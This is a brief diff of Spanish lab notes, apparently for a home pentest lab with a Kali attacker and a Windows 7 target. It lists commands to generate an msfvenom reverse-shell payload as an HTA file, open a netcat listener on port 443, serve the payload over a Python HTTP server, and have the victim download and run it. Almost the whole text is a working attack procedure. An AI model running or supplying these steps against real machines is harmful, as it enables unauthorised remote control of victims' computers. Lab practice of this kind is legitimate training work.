@@ -1,1 +1,10 @@
+++ PC1: Kali
+++ PC2: Windows 7 x64
+
+++ PC1: ip addr show
+++ PC1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip_PC1> LPORT=443 -f hta -psh -o <nombre_archivo.hta> 
+++ PC1: sudo nc -lvp 443 (Establece el listener)
+++ PC1: python3 -m http.server 8080
+++ PC2: Usar un navegador y colocar la ip del PC1 <ip_PC1:8080> 
+++ PC2: Descargar y ejecutar el archivo 
 
